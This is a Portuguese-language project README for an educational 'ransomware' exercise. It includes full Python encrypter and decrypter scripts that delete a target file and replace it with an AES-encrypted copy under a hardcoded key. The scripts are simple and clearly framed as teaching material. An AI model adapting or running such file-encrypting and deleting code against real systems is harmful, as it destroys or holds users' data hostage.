# 🛡️ Desafio: Ransomware em Python

Este projeto simula o funcionamento de um ransomware: um programa capaz de criptografar arquivos e só permitir sua restauração (descriptografia) mediante o uso de uma chave.

> ⚠️ **Atenção**: Este projeto é apenas para fins educacionais. Não utilize este código para prejudicar terceiros. O uso indevido pode ser considerado crime.

---

## 📂 Estrutura do Projeto

desafio-ransomware/
├── encrypter.py # Criptografa arquivos
├── decrypter.py # Descriptografa os arquivos
├── teste.txt # Exemplo de arquivo-alvo


---

## 🎯 Objetivo

O objetivo é mostrar a aplicação prática da criptografia simétrica usando Python, com um exemplo simples de ransomware.

---

## ✅ Pré-requisitos

- Python 3 instalado
- Git instalado (opcional)
- Biblioteca `pyaes`

---

![pasta_de_arquivos](https://github.com/user-attachments/assets/17df57d1-76f6-4d91-ab5b-0e7acca5f832)


## ⚙️ Como Executar o Projeto

📄 encrypter.py – Criptografador de Arquivos
Este script é responsável por:

Ler o conteúdo de um arquivo alvo (ex: teste.txt).

Criptografar os dados usando o algoritmo AES (Advanced Encryption Standard).

Salvar os dados criptografados em um novo arquivo.

(Opcional) Deletar ou renomear o arquivo original.

🧠 Como funciona por dentro:
import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()

![encrypter_01](https://github.com/user-attachments/assets/c366a542-5f16-4cb5-8b63-1e6d39a46464)
![encrypter](https://github.com/user-attachments/assets/727c4687-c647-4959-b578-4101ef452ce3)





##

📄 decrypter.py – Descriptografador de Arquivos
Este script é responsável por:

Ler um arquivo previamente criptografado.

Utilizar a mesma chave de criptografia para restaurar os dados originais.

Salvar os dados restaurados em um novo arquivo (ou sobrescrever o anterior).

🧠 Como funciona por dentro:
import os
import pyaes

## abrir o arquivo criptografado
file_name = "teste.txt.ransomwaretroll"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## chave para descriptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

## remover o arquivo criptografado
os.remove(file_name)

## criar o arquivo descriptografado
new_file = "teste.txt"
new_file = open(f'{new_file}', "wb")
new_file.write(decrypt_data)
new_file.close()

![decrypter](https://github.com/user-attachments/assets/0dfcb1b0-6943-4d46-8c6b-37357e1b78a1)
![decrypter_01](https://github.com/user-attachments/assets/dffc7139-465b-4ce4-9de5-37ed8ccbe338)


